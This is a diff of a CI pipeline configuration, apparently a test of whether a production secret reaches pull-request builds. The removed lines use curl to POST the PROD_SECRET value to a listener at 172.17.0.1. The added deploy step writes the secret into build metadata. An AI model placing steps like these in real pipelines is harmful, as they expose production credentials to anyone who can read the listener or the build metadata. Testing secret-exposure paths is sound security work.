@@ -3,13 +3,11 @@ shared:
 jobs:
   main:
     requires: [~pr, ~commit]
-    secrets:
-      - PROD_SECRET
     steps:
-      - report: 'curl -s -m 15 -X POST --data-binary "job=main PROD_SECRET=[${PROD_SECRET:-UNSET}] SD_PULL_REQUEST=[${SD_PULL_REQUEST:-UNSET}]" http://172.17.0.1:19150/ ; echo reported'
+      - hello: echo "main job ran"
   deploy:
     requires: [main]
     secrets:
       - PROD_SECRET
     steps:
-      - report: 'curl -s -m 15 -X POST --data-binary "job=deploy PROD_SECRET=[${PROD_SECRET:-UNSET}] SD_PULL_REQUEST=[${SD_PULL_REQUEST:-UNSET}]" http://172.17.0.1:19150/ ; echo reported'
+      - leak: meta set secret_seen_by_deploy_job "[${PROD_SECRET:-UNSET}]"
